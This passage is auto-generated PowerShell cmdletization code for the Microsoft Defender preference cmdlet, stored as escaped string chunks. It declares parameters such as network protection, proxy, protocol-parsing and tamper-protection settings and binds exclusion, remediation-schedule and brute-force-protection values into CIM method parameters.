[Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.CloudBlockLevelType]\r\n    ${CloudBlockLevel},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('cloudextimeout')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${CloudExtendedTimeout},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('Disabled','Enabled','AuditMode')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType]\r\n    ${EnableNetworkProtection},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('Disabled','Enabled','AuditMode','BlockDiskModificationOnly','AuditDiskModificationOnly')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ControlledFolderAccessType]\r\n    ${EnableControlledFolderAccess},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${AttackSurfaceReductionOnlyExclusions},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ControlledFolderAccessAllowedApplications},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ControlledFolderAccessProtectedFolders},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${AttackSurfaceReductionRules_Ids},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]]\r\n    ${AttackSurfaceReductionRules_Actions},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('elcp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${EnableLowCpuPriority},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('efhc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${EnableFileHashComputation},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('efsobp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${EnableFullScanOnBatteryPower},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('ppurl')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${ProxyPacUrl},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('proxsrv')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${ProxyServer},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('proxbps')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ProxyBypass},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('fupo')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${ForceUseProxyOnly},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dtlsp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableTlsParsing},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dftpp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableFtpParsing},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dhttpp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableHttpParsing},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('ddnsp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableDnsParsing},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('ddnstcpp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableDnsOverTcpParsing},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dsshp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableSshParsing},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('puc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('NotConfigured','Beta','Preview','Staged','Broad','Delayed')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType]\r\n    ${PlatformUpdatesChannel},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('euc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('NotConfigured','Beta','Preview','Staged','Broad','Delayed')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType]\r\n    ${EngineUpdatesChannel},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('duc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('NotConfigured','Staged','Broad','Delayed')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.DefinitionUpdatesChannelType]\r\n    ${DefinitionUpdatesChannel},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dgr')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableGradualRelease},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('anpdl')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${AllowNetworkProtectionDownLevel},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('adpows')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${AllowDatagramProcessingOnWinServer},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('ednss')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${EnableDnsSinkhole},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dicf')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableInboundConnectionFiltering}"
",\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('drdpp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableRdpParsing},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dnppt')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableNetworkProtectionPerfTelemetry},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('tlps')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${TrustLabelProtectionStatus},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('astai')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${AllowSwitchToAsyncInspection},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('scso')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${ScanScheduleOffset},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dtdtf')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableTDTFeature},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dtp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableTamperProtection},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dsmtpp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableSmtpParsing},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dquicp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableQuicParsing},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('nprepmode')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${NetworkProtectionReputationMode},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('itdte')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${IntelTDTEnabled},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${AttackSurfaceReductionRules_RuleSpecificExclusions_Id},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${AttackSurfaceReductionRules_RuleSpecificExclusions},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('oobers')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${OobeEnableRtpAndSigUpdate},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('pms')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('Enabled','Disabled')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.PerformanceModeStatusType]\r\n    ${PerformanceModeStatus},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('qsie')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('Disabled','ScanRtpExclusions')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.QuickScanIncludeExclusionsType]\r\n    ${QuickScanIncludeExclusions},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dcm')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableCacheMaintenance},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('rstpc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${RemoveScanningThreadPoolCap},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ExclusionPath')) {\r\n          [object]$__cmdletization_value = ${ExclusionPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ExclusionExtension')) {\r\n          [object]$__cmdletization_value = ${ExclusionExtension}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ExclusionProcess')) {\r\n          [object]$__cmdletization_value = ${ExclusionProcess}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ExclusionIpAddress')) {\r\n          [object]$__cmdletization_value = ${ExclusionIpAddress}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionIpAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionIpAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RealTimeScanDirection')) {\r\n          [object]$__cmdletization_value = ${RealTimeScanDirection}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RealTimeScanDirection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanDirection'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RealTimeScanDirection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanDirection'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('QuarantinePurgeItemsAfterDelay')) {\r\n          [object]$__cmdletization_value = ${QuarantinePurgeItemsAfterDelay}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuarantinePurgeItemsAfterDelay'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuarantinePurgeItemsAfterDelay'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RemediationScheduleDay')) {\r\n          [object]$__cmdletization_value = ${RemediationScheduleDay}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_defa"
"ultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RemediationScheduleTime')) {\r\n          [object]$__cmdletization_value = ${RemediationScheduleTime}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RemoteEncryptionProtectionConfiguredState')) {\r\n          [object]$__cmdletization_value = ${RemoteEncryptionProtectionConfiguredState}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionConfiguredState'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.NetworkBehaviorProtectionConfiguredState'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionConfiguredState'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.NetworkBehaviorProtectionConfiguredState'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RemoteEncryptionProtectionMaxBlockTime')) {\r\n          [object]$__cmdletization_value = ${RemoteEncryptionProtectionMaxBlockTime}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionMaxBlockTime'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionMaxBlockTime'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RemoteEncryptionProtectionAggressiveness')) {\r\n          [object]$__cmdletization_value = ${RemoteEncryptionProtectionAggressiveness}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionAggressiveness'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Aggressiveness'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionAggressiveness'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Aggressiveness'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RemoteEncryptionProtectionExclusions')) {\r\n          [object]$__cmdletization_value = ${RemoteEncryptionProtectionExclusions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('BruteForceProtectionConfiguredState')) {\r\n          [object]$__cmdletization_value = ${BruteForceProtectionConfiguredState}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionConfiguredState'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.NetworkBehaviorProtectionConfiguredState'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionConfiguredState'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.NetworkBehaviorProtectionConfiguredState'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('BruteForceProtectionMaxBlockTime')) {\r\n          [object]$__cmdletization_value = ${BruteForceProtectionMaxBlockTime}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionMaxBlockTime'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionMaxBlockTime'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('BruteForceProtectionAggressiveness')) {\r\n          [object]$__cmdletization_value = ${BruteForceProtectionAggressiveness}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionAggressiveness'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Aggressiveness'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionAggressiveness'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Aggressiveness'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('BruteForceProtectionExclusions')) {\r\n          [object]$__cmdletization_value = ${BruteForceProtectionExclusions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ReportingAdditionalActionTimeOut')) {\r\n          [object]$__cmdletization_value = ${ReportingAdditionalActionTimeOut}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingAdditionalActionTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingAdditionalActionTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ReportingCriticalFailureTimeOut')) {\r\n          [object]$__cmdletization_value = ${ReportingCriticalFailureTimeOut}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingCriticalFailureTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingCriticalFailureTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        